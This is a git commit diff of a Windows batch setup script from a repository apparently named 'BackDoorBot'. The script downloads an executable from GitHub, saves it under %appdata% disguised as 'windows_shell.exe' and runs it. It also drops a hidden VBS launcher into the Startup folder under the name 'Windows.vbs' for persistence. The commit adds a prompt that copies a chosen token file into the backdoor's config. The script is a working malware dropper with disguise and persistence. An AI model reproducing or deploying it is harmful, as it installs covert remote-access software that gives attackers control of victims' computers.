5585f6ecc62eaef4a542b14dd954b43fd18dd252
Одинцов Дмитрий <dmodv@vk.com>
2022-10-30 11:46:12 +0300

    add back-d

--- bot/setup.bat
+++ bot/setup.bat
@@ -1,9 +1,13 @@
 @echo off
 
+set /p Token="Token: "
+
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/back-d.exe -OutFile %appdata%\Microsoft\Windows\windows_shell.exe"
 
 start %appdata%\Microsoft\Windows\windows_shell.exe
 
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/invis.vbs -OutFile '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows.vbs'"
+
+copy ".\token\%Token%.txt" "%appdata%\Microsoft\Windows\back-d\config.json"
 
 pause > nul
